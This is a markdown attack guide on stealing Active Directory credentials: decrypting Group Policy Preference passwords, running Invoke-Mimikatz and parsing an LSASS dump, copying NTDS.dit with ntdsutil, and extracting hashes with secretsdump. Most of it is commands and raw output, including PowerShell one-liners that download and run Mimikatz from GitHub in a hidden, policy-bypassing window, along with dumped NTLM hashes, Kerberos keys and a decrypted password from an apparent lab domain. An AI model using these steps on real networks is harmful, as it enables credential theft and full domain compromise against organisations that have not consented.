**Authors**: < [nixawk](https://github.com/nixawk) >

----

## Passwords in SYSVOL & Group Policy Preferences

This method is the simplest since no special “hacking” tool is required. All the attacker has to do is open up Windows explorer and search the domain SYSVOL DFS share for XML files. Most of the time, the following XML files will contain credentials: groups.xml, scheduledtasks.xml, & Services.xml.

SYSVOL is the domain-wide share in Active Directory to which all authenticated users have read access. SYSVOL contains logon scripts, group policy data, and other domain-wide data which needs to be available anywhere there is a Domain Controller (since SYSVOL is automatically synchronized and shared among all Domain Controllers). All domain Group Policies are stored here: \\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\

When a new GPP is created, there’s an associated XML file created in SYSVOL with the relevant configuration data and if there is a password provided, it is AES-256 bit encrypted which should be good enough…

Except at some point prior to 2012, [Microsoft published the AES encryption key (shared secret) on MSDN](https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx) which can be used to decrypt the password. Since authenticated users (any domain user or users in a trusted domain) have read access to SYSVOL, anyone in the domain can search the SYSVOL share for XML files containing “cpassword” which is the value that contains the AES encrypted password.

With access to this XML file, the attacker can use the AES private key to decrypt the GPP password. The PowerSploit function Get-GPPPassword is most useful for Group Policy Preference exploitation. The screenshot here shows a similar PowerShell function encrypting the GPP password from an XML file found in SYSVOL.

```
PS C:\Users\Administrator\Desktop> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1")
PS C:\Users\Administrator\Desktop> Get-GPPPassword
```

```
msf post(gpp) > show options

Module options (post/windows/gather/credentials/gpp):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   ALL      true             no        Enumerate all domains on network.
   DOMAINS  THEGEEKSTUFF     no        Enumerate list of space seperated domains DOMAINS="dom1 dom2".
   SESSION  1                yes       The session to run this module on.
   STORE    true             no        Store the enumerated files in loot.

msf post(gpp) > run

[*] Checking for group policy history objects...
[-] Error accessing C:\ProgramData\Microsoft\Group Policy\History : stdapi_fs_ls: Operation failed: The system cannot find the path specified.
[*] Checking for SYSVOL locally...
[+] SYSVOL Group Policy Files found locally
[*] Enumerating the user supplied Domain(s): THEGEEKSTUFF...
[*] Enumerating DCs for THEGEEKSTUFF on the network...
[-] ERROR_NO_BROWSER_SERVERS_FOUND
[-] No Domain Controllers found for THEGEEKSTUFF
[*] Searching for Group Policy XML Files...
[*] Post module execution completed
```

```
metasploit-framework [rapid7-master] ->> ./tools/password/cpassword_decrypt.rb j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
[+] The decrypted AES password is: Local*P4ssword!
```

Or

you can also do it with [gpp_password_decrypt.py](https://github.com/nixawk/python-programming/blob/master/crypto/gpp_password_decrypt.py).


## Dump credentials with Invoke-Mimikatz

[**Invoke-Mimikatz**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1) should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.

```
PS C:\Users\Administrator\Desktop> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1")
PS C:\Users\Administrator\Desktop> Invoke-Mimikatz
```

or

```
C:\Windows\system32> powershell.exe -exec bypass -windows hidden -c IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1");Invoke-Mimikatz
```

## Dump LSASS memory with Task Manager (get Domain Admin credentials)

Once LSASS is dumped, Mimikatz can be used to extract logged on credentials from the LSASS.dmp file on a different system. On a Domain Controller, this almost always results in Domain Admin credentials.

![](windows-2012-lsass-dump.png)

```
PS C:\Users\Administrator\Desktop\MimikatzX64> .\mimikatz.exe

  .#####.   mimikatz 2.1 (x64) built on Oct 29 2016 21:27:40
 .## ^ ##.  "A La Vie, A L'Amour"
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                     with 20 modules * * */

mimikatz # sekurlsa::minidump C:\Users\Administrator\Desktop\lsass.DMP
Switch to MINIDUMP : 'C:\Users\Administrator\Desktop\lsass.DMP'

mimikatz # sekurlsa::logonpasswords
Opening : 'C:\Users\Administrator\Desktop\lsass.DMP' file for minidump...

Authentication Id : 0 ; 391874 (00000000:0005fac2)
Session           : Interactive from 1
User Name         : Administrator
Domain            : THEGEEKSTUFF
Logon Server      : SERVER
Logon Time        : 2016/11/5 12:08:54
SID               : S-1-5-21-2783134295-2946968820-3756090084-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : THEGEEKSTUFF
         * NTLM     : fc1fc80e9f128261a6bc463cb31e65b5
         * SHA1     : 9fb867ff5ae033514134f54b5bacfa209d135125
         [00010000] CredentialKeys
         * NTLM     : fc1fc80e9f128261a6bc463cb31e65b5
         * SHA1     : 9fb867ff5ae033514134f54b5bacfa209d135125
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : THEGEEKSTUFF
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : THEGEEKSTUFF.COM
         * Password : (null)
        ssp :   KO
        credman :

Authentication Id : 0 ; 66164 (00000000:00010274)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2016/11/5 12:07:53
SID               : S-1-5-90-1
        msv :
         [00000003] Primary
         * Username : SERVER$
         * Domain   : THEGEEKSTUFF
         * NTLM     : 708faf9c9842a10735ecab33cc64ed37
         * SHA1     : 170fc50c1613bc049225066bba08514ac35f1bce
        tspkg :
        wdigest :
         * Username : SERVER$
         * Domain   : THEGEEKSTUFF
         * Password : (null)
        kerberos :
         * Username : SERVER$
         * Domain   : thegeekstuff.com
         * Password : 0c f1 e2 be 81 2f 1e 4d a2 90 14 dc 84 1f c1 8c 41 0e e3 9b 7d 49 49 30 c8 63 b4 59 a9 d2 9e 08 e1
 aa 9c 40 dc 5b c8 17 42 7e a7 7f e4 f6 9f 1d 80 a7 ee 1c 00 7e 19 ce 5b 4a b4 53 f4 7f 45 8f 49 71 03 a6 55 12 0e c4 3f
 9d 87 a4 0d ca 5c bd 6d eb 6f 4e cb d7 3f 8c e9 39 07 26 65 fc c6 ac cb 81 31 7f 55 dd ac 8a 49 1d 16 a8 79 8b 2d 33 b7
 2d 42 f5 19 a5 17 32 56 88 c0 e2 08 50 62 0b c9 f2 e9 47 13 cb 72 20 d3 b2 b7 ba f3 54 c4 27 86 2c 71 b3 33 dc 9d 77 ff
 27 16 43 5c 8e fb fa ab 89 e0 f8 ae f1 b1 be 58 c0 e5 7b 76 a9 d4 80 37 18 6d 47 0d 7e 2b aa 0c cd b5 cb be 77 21 77 d1
 52 d8 ba 5a 0f 5d 0e 74 7c 97 05 00 27 a0 51 cb 3b 95 d5 a7 55 37 49 0d 84 7a f6 d8 96 30 d3 06 a8 cb a3 91 8e 98 ad b7
 8a 86 a9 c8 b8 ea c3
        ssp :   KO
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SERVER$
Domain            : THEGEEKSTUFF
Logon Server      : (null)
Logon Time        : 2016/11/5 12:07:53
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : SERVER$
         * Domain   : THEGEEKSTUFF
         * NTLM     : 708faf9c9842a10735ecab33cc64ed37
         * SHA1     : 170fc50c1613bc049225066bba08514ac35f1bce
        tspkg :
        wdigest :
         * Username : SERVER$
         * Domain   : THEGEEKSTUFF
         * Password : (null)
        kerberos :
         * Username : server$
         * Domain   : THEGEEKSTUFF.COM
         * Password : (null)
        ssp :   KO
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2016/11/5 12:07:54
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :   KO
        credman :

Authentication Id : 0 ; 66429 (00000000:0001037d)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2016/11/5 12:07:53
SID               : S-1-5-90-1
        msv :
         [00000003] Primary
         * Username : SERVER$
         * Domain   : THEGEEKSTUFF
         * NTLM     : 708faf9c9842a10735ecab33cc64ed37
         * SHA1     : 170fc50c1613bc049225066bba08514ac35f1bce
        tspkg :
        wdigest :
         * Username : SERVER$
         * Domain   : THEGEEKSTUFF
         * Password : (null)
        kerberos :
         * Username : SERVER$
         * Domain   : thegeekstuff.com
         * Password : 0c f1 e2 be 81 2f 1e 4d a2 90 14 dc 84 1f c1 8c 41 0e e3 9b 7d 49 49 30 c8 63 b4 59 a9 d2 9e 08 e1
 aa 9c 40 dc 5b c8 17 42 7e a7 7f e4 f6 9f 1d 80 a7 ee 1c 00 7e 19 ce 5b 4a b4 53 f4 7f 45 8f 49 71 03 a6 55 12 0e c4 3f
 9d 87 a4 0d ca 5c bd 6d eb 6f 4e cb d7 3f 8c e9 39 07 26 65 fc c6 ac cb 81 31 7f 55 dd ac 8a 49 1d 16 a8 79 8b 2d 33 b7
 2d 42 f5 19 a5 17 32 56 88 c0 e2 08 50 62 0b c9 f2 e9 47 13 cb 72 20 d3 b2 b7 ba f3 54 c4 27 86 2c 71 b3 33 dc 9d 77 ff
 27 16 43 5c 8e fb fa ab 89 e0 f8 ae f1 b1 be 58 c0 e5 7b 76 a9 d4 80 37 18 6d 47 0d 7e 2b aa 0c cd b5 cb be 77 21 77 d1
 52 d8 ba 5a 0f 5d 0e 74 7c 97 05 00 27 a0 51 cb 3b 95 d5 a7 55 37 49 0d 84 7a f6 d8 96 30 d3 06 a8 cb a3 91 8e 98 ad b7
 8a 86 a9 c8 b8 ea c3
        ssp :   KO
        credman :

Authentication Id : 0 ; 44395 (00000000:0000ad6b)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2016/11/5 12:07:52
SID               :
        msv :
         [00000003] Primary
         * Username : SERVER$
         * Domain   : THEGEEKSTUFF
         * NTLM     : 708faf9c9842a10735ecab33cc64ed37
         * SHA1     : 170fc50c1613bc049225066bba08514ac35f1bce
        tspkg :
        wdigest :
        kerberos :
        ssp :   KO
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SERVER$
Domain            : THEGEEKSTUFF
Logon Server      : (null)
Logon Time        : 2016/11/5 12:07:52
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : SERVER$
         * Domain   : THEGEEKSTUFF
         * Password : (null)
        kerberos :
         * Username : server$
         * Domain   : THEGEEKSTUFF.COM
         * Password : (null)
        ssp :   KO
        credman :

mimikatz # exit
Bye!
PS C:\Users\Administrator\Desktop\MimikatzX64>
```

## Create Install From Media (IFM) set using NTDSUtil (Grab NTDS.dit file)

NTDSUtil is the command utility for natively working with the AD DB (ntds.dit) & enables IFM set creation for DCPromo. IFM is used with DCPromo to “Install From Media” so the server being promoted doesn’t need to copy domain data over the network from another DC. The IFM set is a copy of the NTDS.dit file created in this instance in c:\temp.

This file may be staged on a share for promoting new DCs or it may be found on a new server that has not been promoted yet. This server may not be properly secured.

```
C:\Users\Administrator>ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
ntdsutil: ac i ntds
活动实例设置为“ntds”。
ntdsutil: ifm
ifm: create full c:\temp
正在创建快照...
成功生成快照集 {03d7e751-8489-4bee-b7c1-fde165f87426}。
快照 {e236f8b9-10e5-4404-ac4d-843f1db29f1e} 已作为 C:\$SNAP_201611051210_VOLUMEC$\ 装载
已装载快照 {e236f8b9-10e5-4404-ac4d-843f1db29f1e}。
正在启动碎片整理模式...
     源数据库: C:\$SNAP_201611051210_VOLUMEC$\Windows\NTDS\ntds.dit
     目标数据库: c:\temp\Active Directory\ntds.dit

                  Defragmentation  Status (% complete)

          0    10   20   30   40   50   60   70   80   90  100
          |----|----|----|----|----|----|----|----|----|----|
          ...................................................

正在复制注册表文件...
正在复制 c:\temp\registry\SYSTEM
正在复制 c:\temp\registry\SECURITY
快照 {e236f8b9-10e5-4404-ac4d-843f1db29f1e} 已卸载。
在 c:\temp 中成功创建 IFM 媒体。
ifm: q
ntdsutil: q
```

## Extract Hashes from NTDS.dit

Once the attacker has a copy of the NTDS.dit file (and certain registry keys to decrypt security elements in the database file), the credential data in the Active Directory database file can be extracted.

One method to extract the password hashes from the NTDS.dit file is Impacket’s secretsdump.py (Kali, etc).
Just need the ntds.dit file and the System hive from the DC’s registry (you have both of these with an Install from Media (IFM) set from ntdsutil).


```
$ git clone https://github.com/CoreSecurity/impacket/
$ cd impacket/examples/
```

```
$ secretsdump.py -system /home/seclab/windows-2012/ntds/registry/SYSTEM -security /home/seclab/windows-2012/ntds/registry/SECURITY -ntds /home/seclab/windows-2012/ntds/Active\ Directory/ntds.dit LOCAL
Impacket v0.9.16-dev - Copyright 2002-2016 Core Security Technologies

[*] Target system bootKey: 0xb6570f7db706f37a5b79e72ab8c44b8a
[*] Dumping cached domain logon information (uid:encryptedHash:longDomain:domain)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:708faf9c9842a10735ecab33cc64ed37
[*] DefaultPassword
(Unknown User):ROOT#123
[*] DPAPI_SYSTEM
 0000   01 00 00 00 8F 04 A9 BA  67 3B 83 81 09 62 0E 80   ........g;...b..
 0010   81 81 DB 99 FF 3E 7A F8  EE 80 BC 7F 8F C8 FA DE   .....>z.........
 0020   3D BE 24 6D 30 38 84 48  1A 5F B3 11               =.$m08.H._..
[*] NL$KM
 0000   39 7B 96 FE 24 6D B9 58  44 A6 DF 78 77 F9 78 C9   9{..$m.XD..xw.x.
 0010   72 F8 57 E6 C9 60 65 07  50 F5 EA 81 D7 5B A1 D2   r.W..`e.P....[..
 0020   D3 46 E8 67 3F C1 C8 8C  44 91 EA 62 20 9E 5A 58   .F.g?...D..b .ZX
 0030   E4 C1 25 24 4F 01 6F AF  88 04 5F 33 89 FE D5 1E   ..%$O.o..._3....
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 0487dfc92c64213bdf39ca382d7baea8
[*] Reading and decrypting hashes from /home/seclab/windows-2012/ntds/Active Directory/ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc1fc80e9f128261a6bc463cb31e65b5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SERVER$:1003:aad3b435b51404eeaad3b435b51404ee:708faf9c9842a10735ecab33cc64ed37:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:23ed7e50c091488d46c46ca69b428979:::
wchen:1109:aad3b435b51404eeaad3b435b51404ee:fe72ec788d6739b4ac05033fecae793c:::
jhart:1110:aad3b435b51404eeaad3b435b51404ee:d491885ff154677f71291be4517d7177:::
SERVER2008$:1111:aad3b435b51404eeaad3b435b51404ee:db96a49b7ecf92cfd3a20b0c8048eef1:::
john:1112:aad3b435b51404eeaad3b435b51404ee:6944c3f3a4ad58896b5fdb55b29f4fdf:::
JOHN$:1113:aad3b435b51404eeaad3b435b51404ee:3926a5fc5b0eb8b373ebfc37d2f478d6:::
[*] Kerberos keys from /home/seclab/windows-2012/ntds/Active Directory/ntds.dit
SERVER$:aes256-cts-hmac-sha1-96:cc03dbc4f30db35f8f2a3894f3dccea99207f6180db7c9f98a1a363f80986e22
SERVER$:aes128-cts-hmac-sha1-96:a43c9870cf2798fd86eb502391281df9
SERVER$:des-cbc-md5:b9ef3b08b55e8998
krbtgt:aes256-cts-hmac-sha1-96:f5f37669f8fe6b10a3b65dddf09f80f78b1ce1f351e47130adfb70aa81eeff82
krbtgt:aes128-cts-hmac-sha1-96:a3bea9e21a87976f582de5a9a4c6784a
krbtgt:des-cbc-md5:028adaf497028076
wchen:aes256-cts-hmac-sha1-96:c979d56fa938026e30ef8e8959ded691dcdc1abfb62c79e9061e42cb3ea5cd6f
wchen:aes128-cts-hmac-sha1-96:464ee4707eb40a19d833afe1e5be6244
wchen:des-cbc-md5:0be69b2ada3dbcf4
jhart:aes256-cts-hmac-sha1-96:d1bb033c02346050588ac074871f7c13be08952936d0443221de2af820181407
jhart:aes128-cts-hmac-sha1-96:dc6f858f75486dd03f9b88dd3a0cd41f
jhart:des-cbc-md5:895d10bf830d7961
SERVER2008$:aes256-cts-hmac-sha1-96:f88aa76cd58df5804762bcae3607a36566b299394622cd3a04e0f63baa179527
SERVER2008$:aes128-cts-hmac-sha1-96:ff258dfec8bfb3c0683eafb49799b943
SERVER2008$:des-cbc-md5:cb5e5e32dfa475b6
john:aes256-cts-hmac-sha1-96:6fb59e65a4ba99987759e87f4aa2435f155a15233ddc1eb763250d495f94212e
john:aes128-cts-hmac-sha1-96:7e57a1d9f658456ec4ce24282d80a835
john:des-cbc-md5:ea8aadecea46e6c4
JOHN$:aes256-cts-hmac-sha1-96:05edf93acc4dd9c08af27f1c3ee8674185087e5321b57f290ac764c1bfdc025c
JOHN$:aes128-cts-hmac-sha1-96:529d1632aa0283f7ba2d1c4ca216a22f
JOHN$:des-cbc-md5:e029798f8f92e0da
[*] Cleaning up...
```

## References

1. https://www.youtube.com/watch?v=0WyBxwJD_c0
2. http://www.thegeekstuff.com/2014/11/install-active-directory
3. [How Attackers Dump Active Directory Database Credentials](https://adsecurity.org/?p=2398)
4. [How Attackers Pull the Active Directory Database (NTDS.dit) from a Domain Controller](https://adsecurity.org/?p=451)
5. [Attack Methods for Gaining Domain Admin Rights in Active Directory](https://adsecurity.org/?p=451)
6. [Unofficial Guide to Mimikatz & Command Reference](https://adsecurity.org/?page_id=1821#SEKURLSALogonPasswords)
